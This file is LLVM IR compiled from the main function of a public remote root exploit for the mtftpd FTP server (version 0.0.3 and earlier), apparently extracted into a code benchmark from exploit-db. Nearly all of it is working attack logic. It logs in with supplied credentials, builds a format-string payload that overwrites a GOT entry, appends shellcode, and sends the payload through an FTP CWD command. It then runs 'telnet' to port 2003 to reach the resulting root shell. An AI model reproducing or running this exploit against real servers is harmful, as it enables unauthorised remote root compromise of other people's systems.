; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_902.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_902.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [39 x i8] c"\0A\0Amtftpd <= 0.0.3 remote root exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [34 x i8] c"by darkeagle [http://unl0ck.org]\0A\00", align 1
@.str.2 = private unnamed_addr constant [11 x i8] c"p:u:a:g:r:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i8* null, align 8
@GOT_ADDR = common dso_local global i32 0, align 4
@RETADDR = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [98 x i8] c"\0A [`] GOT: 0x%x\0A [`] Retaddr: 0x%x\0A [`] Username: %s\0A [`] Password: %s\0A [`] IP: %s\0A [`] Port: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [35 x i8] c" [`] Creating SOCKET structure...\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@PORT = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_IP = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [22 x i8] c" [+] Structure Done!\0A\00", align 1
@.str.6 = private unnamed_addr constant [20 x i8] c" [`] Connecting...\09\00", align 1
@.str.7 = private unnamed_addr constant [9 x i8] c"FAILED!\0A\00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"OK!\0A\00", align 1
@.str.9 = private unnamed_addr constant [25 x i8] c" [+] Sending LOGIN DATA\0A\00", align 1
@.str.10 = private unnamed_addr constant [23 x i8] c"USER %s\0D\0A\0D\0APASS %s\0D\0A\0D\0A\00", align 1
@.str.11 = private unnamed_addr constant [4 x i8] c"230\00", align 1
@.str.12 = private unnamed_addr constant [27 x i8] c" [+] Successfully logged!\0A\00", align 1
@.str.13 = private unnamed_addr constant [34 x i8] c" [-] Invalid login or password!\0A\0A\00", align 1
@.str.14 = private unnamed_addr constant [28 x i8] c" [`] Creating EviL Data...\09\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.15 = private unnamed_addr constant [28 x i8] c"Can't allocate buffer (%d)\0A\00", align 1
@.str.16 = private unnamed_addr constant [2 x i8] c"U\00", align 1
@.str.17 = private unnamed_addr constant [33 x i8] c"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\00", align 1
@shellcode = common dso_local global i8* null, align 8
@.str.18 = private unnamed_addr constant [11 x i8] c"CWD %s\0D\0A\0D\0A\00", align 1
@.str.19 = private unnamed_addr constant [17 x i8] c" [`] Sending...\09\00", align 1
@.str.20 = private unnamed_addr constant [16 x i8] c"telnet %s 2003\0A\00", align 1
@.str.21 = private unnamed_addr constant [29 x i8] c" [+] Connecting to shell...\09\00", align 1
@.str.22 = private unnamed_addr constant [10 x i8] c"FAILED!\0A\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8, align 1
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca [3000 x i8], align 16
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca [300 x i8], align 16
  %27 = alloca %struct.sockaddr_in, align 4
  %28 = alloca i32, align 4
  %29 = alloca [300 x i8], align 16
  %30 = alloca [200 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %13, align 4
  store i8* null, i8** %20, align 8
  store i8* null, i8** %21, align 8
  store i8* null, i8** %22, align 8
  store i32 0, i32* %24, align 4
  store i32 0, i32* %25, align 4
  %31 = load i32, i32* %4, align 4
  %32 = icmp slt i32 %31, 6
  br i1 %32, label %33, label %38

33:                                               ; preds = %2
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @usage(i8* %36)
  br label %38

38:                                               ; preds = %33, %2
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str, i64 0, i64 0))
  %40 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.1, i64 0, i64 0))
  br label %41

41:                                               ; preds = %69, %38
  %42 = load i32, i32* %4, align 4
  %43 = load i8**, i8*** %5, align 8
  %44 = call signext i8 @getopt(i32 %42, i8** %43, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.2, i64 0, i64 0))
  store i8 %44, i8* %6, align 1
  %45 = sext i8 %44 to i32
  %46 = load i8, i8* @EOF, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp ne i32 %45, %47
  br i1 %48, label %49, label %70

49:                                               ; preds = %41
  %50 = load i8, i8* %6, align 1
  %51 = sext i8 %50 to i32
  switch i32 %51, label %64 [
    i32 112, label %52
    i32 97, label %54
    i32 103, label %56
    i32 114, label %59
    i32 117, label %62
  ]

52:                                               ; preds = %49
  %53 = load i8*, i8** @optarg, align 8
  store i8* %53, i8** %21, align 8
  br label %69

54:                                               ; preds = %49
  %55 = load i8*, i8** @optarg, align 8
  store i8* %55, i8** %22, align 8
  br label %69

56:                                               ; preds = %49
  %57 = load i8*, i8** @optarg, align 8
  %58 = call i32 @strtoul(i8* %57, i32* null, i32 0)
  store i32 %58, i32* %24, align 4
  br label %69

59:                                               ; preds = %49
  %60 = load i8*, i8** @optarg, align 8
  %61 = call i32 @strtoul(i8* %60, i32* null, i32 0)
  store i32 %61, i32* %25, align 4
  br label %69

62:                                               ; preds = %49
  %63 = load i8*, i8** @optarg, align 8
  store i8* %63, i8** %20, align 8
  br label %69

64:                                               ; preds = %49
  %65 = load i8**, i8*** %5, align 8
  %66 = getelementptr inbounds i8*, i8** %65, i64 0
  %67 = load i8*, i8** %66, align 8
  %68 = call i32 @usage(i8* %67)
  br label %69

69:                                               ; preds = %64, %62, %59, %56, %54, %52
  br label %41

70:                                               ; preds = %41
  %71 = load i32, i32* %24, align 4
  %72 = icmp eq i32 %71, 0
  br i1 %72, label %76, label %73

73:                                               ; preds = %70
  %74 = load i32, i32* %25, align 4
  %75 = icmp eq i32 %74, 0
  br i1 %75, label %76, label %79

76:                                               ; preds = %73, %70
  %77 = load i32, i32* @GOT_ADDR, align 4
  store i32 %77, i32* %24, align 4
  %78 = load i32, i32* @RETADDR, align 4
  store i32 %78, i32* %25, align 4
  br label %79

79:                                               ; preds = %76, %73
  %80 = load i32, i32* %24, align 4
  %81 = load i32, i32* %25, align 4
  %82 = load i8*, i8** %20, align 8
  %83 = load i8*, i8** %21, align 8
  %84 = load i8*, i8** %22, align 8
  %85 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([98 x i8], [98 x i8]* @.str.3, i64 0, i64 0), i32 %80, i32 %81, i8* %82, i8* %83, i8* %84, i32 21)
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.4, i64 0, i64 0))
  %87 = load i32, i32* @AF_INET, align 4
  %88 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  store i32 %87, i32* %88, align 4
  %89 = load i32, i32* @PORT, align 4
  %90 = call i32 @htons(i32 %89)
  %91 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i32 %90, i32* %91, align 4
  %92 = load i8*, i8** %22, align 8
  %93 = call i32 @inet_addr(i8* %92)
  %94 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  %95 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %94, i32 0, i32 0
  store i32 %93, i32* %95, align 4
  %96 = load i32, i32* @AF_INET, align 4
  %97 = load i32, i32* @SOCK_STREAM, align 4
  %98 = load i32, i32* @IPPROTO_IP, align 4
  %99 = call i32 @socket(i32 %96, i32 %97, i32 %98)
  store i32 %99, i32* %28, align 4
  %100 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.5, i64 0, i64 0))
  %101 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.6, i64 0, i64 0))
  %102 = load i32, i32* %28, align 4
  %103 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  %104 = call i32 @connect(i32 %102, %struct.sockaddr* %103, i32 12)
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %106, label %109

106:                                              ; preds = %79
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0))
  %108 = call i32 @exit(i32 0) #3
  unreachable

109:                                              ; preds = %79
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0))
  %111 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.9, i64 0, i64 0))
  %112 = getelementptr inbounds [300 x i8], [300 x i8]* %26, i64 0, i64 0
  %113 = load i8*, i8** %20, align 8
  %114 = load i8*, i8** %21, align 8
  %115 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %112, i32 300, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.10, i64 0, i64 0), i8* %113, i8* %114)
  %116 = load i32, i32* %28, align 4
  %117 = getelementptr inbounds [300 x i8], [300 x i8]* %26, i64 0, i64 0
  %118 = getelementptr inbounds [300 x i8], [300 x i8]* %26, i64 0, i64 0
  %119 = call i32 @strlen(i8* %118)
  %120 = call i32 @send(i32 %116, i8* %117, i32 %119, i32 0)
  %121 = load i32, i32* %28, align 4
  %122 = getelementptr inbounds [200 x i8], [200 x i8]* %30, i64 0, i64 0
  %123 = call i32 @recv(i32 %121, i8* %122, i32 200, i32 0)
  %124 = getelementptr inbounds [200 x i8], [200 x i8]* %30, i64 0, i64 0
  %125 = call i64 @strstr(i8* %124, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.11, i64 0, i64 0))
  %126 = icmp ne i64 %125, 0
  br i1 %126, label %127, label %129

127:                                              ; preds = %109
  %128 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.12, i64 0, i64 0))
  br label %132

129:                                              ; preds = %109
  %130 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.13, i64 0, i64 0))
  %131 = call i32 @exit(i32 0) #3
  unreachable

132:                                              ; preds = %127
  %133 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.14, i64 0, i64 0))
  store i32 129, i32* %18, align 4
  %134 = load i32, i32* %18, align 4
  %135 = sext i32 %134 to i64
  %136 = mul i64 %135, 1
  %137 = trunc i64 %136 to i32
  %138 = call i64 @malloc(i32 %137)
  %139 = inttoptr i64 %138 to i8*
  store i8* %139, i8** %8, align 8
  %140 = icmp ne i8* %139, null
  br i1 %140, label %146, label %141

141:                                              ; preds = %132
  %142 = load i32, i32* @stderr, align 4
  %143 = load i32, i32* %18, align 4
  %144 = call i32 @fprintf(i32 %142, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.15, i64 0, i64 0), i32 %143)
  %145 = call i32 @exit(i32 -1) #3
  unreachable

146:                                              ; preds = %132
  %147 = load i8*, i8** %8, align 8
  %148 = load i32, i32* %18, align 4
  %149 = call i32 @memset(i8* %147, i32 0, i32 %148)
  store i32 0, i32* %19, align 4
  %150 = load i32, i32* %24, align 4
  %151 = sext i32 %150 to i64
  store i64 %151, i64* %9, align 8
  %152 = load i32, i32* %25, align 4
  %153 = sext i32 %152 to i64
  store i64 %153, i64* %10, align 8
  store i32 12, i32* %11, align 4
  store i32 4, i32* %12, align 4
  %154 = load i8, i8* %14, align 1
  %155 = load i8, i8* %15, align 1
  %156 = load i8, i8* %16, align 1
  %157 = load i8, i8* %17, align 1
  %158 = load i64, i64* %9, align 8
  %159 = call i32 @doit(i8 zeroext %154, i8 zeroext %155, i8 zeroext %156, i8 zeroext %157, i64 %158)
  %160 = load i32, i32* %12, align 4
  %161 = urem i32 %160, 4
  %162 = icmp ne i32 %161, 0
  br i1 %162, label %163, label %170

163:                                              ; preds = %146
  %164 = load i32, i32* %12, align 4
  %165 = urem i32 %164, 4
  %166 = sub i32 4, %165
  store i32 %166, i32* %13, align 4
  %167 = load i32, i32* %13, align 4
  %168 = load i32, i32* %12, align 4
  %169 = add i32 %168, %167
  store i32 %169, i32* %12, align 4
  br label %170

170:                                              ; preds = %163, %146
  %171 = load i8*, i8** %8, align 8
  %172 = call i32 @strcat(i8* %171, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.16, i64 0, i64 0))
  %173 = load i8*, i8** %8, align 8
  %174 = load i8*, i8** %8, align 8
  %175 = call i32 @strlen(i8* %174)
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds i8, i8* %173, i64 %176
  %178 = load i32, i32* %18, align 4
  %179 = load i8, i8* %17, align 1
  %180 = zext i8 %179 to i32
  %181 = load i8, i8* %16, align 1
  %182 = zext i8 %181 to i32
  %183 = load i8, i8* %15, align 1
  %184 = zext i8 %183 to i32
  %185 = load i8, i8* %14, align 1
  %186 = zext i8 %185 to i32
  %187 = load i8, i8* %17, align 1
  %188 = zext i8 %187 to i32
  %189 = add nsw i32 %188, 1
  %190 = load i8, i8* %16, align 1
  %191 = zext i8 %190 to i32
  %192 = load i8, i8* %15, align 1
  %193 = zext i8 %192 to i32
  %194 = load i8, i8* %14, align 1
  %195 = zext i8 %194 to i32
  %196 = load i8, i8* %17, align 1
  %197 = zext i8 %196 to i32
  %198 = add nsw i32 %197, 2
  %199 = load i8, i8* %16, align 1
  %200 = zext i8 %199 to i32
  %201 = load i8, i8* %15, align 1
  %202 = zext i8 %201 to i32
  %203 = load i8, i8* %14, align 1
  %204 = zext i8 %203 to i32
  %205 = load i8, i8* %17, align 1
  %206 = zext i8 %205 to i32
  %207 = add nsw i32 %206, 3
  %208 = load i8, i8* %16, align 1
  %209 = zext i8 %208 to i32
  %210 = load i8, i8* %15, align 1
  %211 = zext i8 %210 to i32
  %212 = load i8, i8* %14, align 1
  %213 = zext i8 %212 to i32
  %214 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %177, i32 %178, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.17, i64 0, i64 0), i32 %180, i32 %182, i32 %184, i32 %186, i32 %189, i32 %191, i32 %193, i32 %195, i32 %198, i32 %200, i32 %202, i32 %204, i32 %207, i32 %209, i32 %211, i32 %213)
  %215 = load i64, i64* %10, align 8
  %216 = load i32, i32* %11, align 4
  %217 = load i32, i32* %12, align 4
  %218 = call i8* @build_un(i64 %215, i32 %216, i32 %217, i32 16)
  store i8* %218, i8** %7, align 8
  %219 = load i8*, i8** %7, align 8
  %220 = load i8*, i8** %7, align 8
  %221 = call i32 @strlen(i8* %220)
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds i8, i8* %219, i64 %222
  %224 = call i32 @memset(i8* %223, i32 66, i32 48)
  %225 = load i8*, i8** %7, align 8
  %226 = load i8*, i8** @shellcode, align 8
  %227 = call i32 @strcat(i8* %225, i8* %226)
  %228 = getelementptr inbounds [3000 x i8], [3000 x i8]* %23, i64 0, i64 0
  %229 = load i8*, i8** %7, align 8
  %230 = call i32 @sprintf(i8* %228, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.18, i64 0, i64 0), i8* %229)
  %231 = getelementptr inbounds [3000 x i8], [3000 x i8]* %23, i64 0, i64 0
  %232 = call i32 @strlen(i8* %231)
  %233 = icmp sge i32 %232, 256
  br i1 %233, label %234, label %237

234:                                              ; preds = %170
  %235 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.7, i64 0, i64 0))
  %236 = call i32 @exit(i32 0) #3
  unreachable

237:                                              ; preds = %170
  %238 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0))
  %239 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.19, i64 0, i64 0))
  %240 = load i32, i32* %28, align 4
  %241 = getelementptr inbounds [3000 x i8], [3000 x i8]* %23, i64 0, i64 0
  %242 = getelementptr inbounds [3000 x i8], [3000 x i8]* %23, i64 0, i64 0
  %243 = call i32 @strlen(i8* %242)
  %244 = call i32 @send(i32 %240, i8* %241, i32 %243, i32 0)
  %245 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0))
  %246 = getelementptr inbounds [300 x i8], [300 x i8]* %29, i64 0, i64 0
  %247 = load i8*, i8** %22, align 8
  %248 = call i32 @sprintf(i8* %246, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.20, i64 0, i64 0), i8* %247)
  %249 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.21, i64 0, i64 0))
  %250 = call i32 @sleep(i32 2)
  %251 = getelementptr inbounds [300 x i8], [300 x i8]* %29, i64 0, i64 0
  %252 = call i32 @system(i8* %251)
  %253 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.22, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @strtoul(i8*, i32*, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @snprintf(i8*, i32, i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i64 @strstr(i8*, i8*) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @fprintf(i32, i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @doit(i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i64) #1

declare dso_local i32 @strcat(i8*, i8*) #1

declare dso_local i8* @build_un(i64, i32, i32, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*) #1

declare dso_local i32 @sleep(i32) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
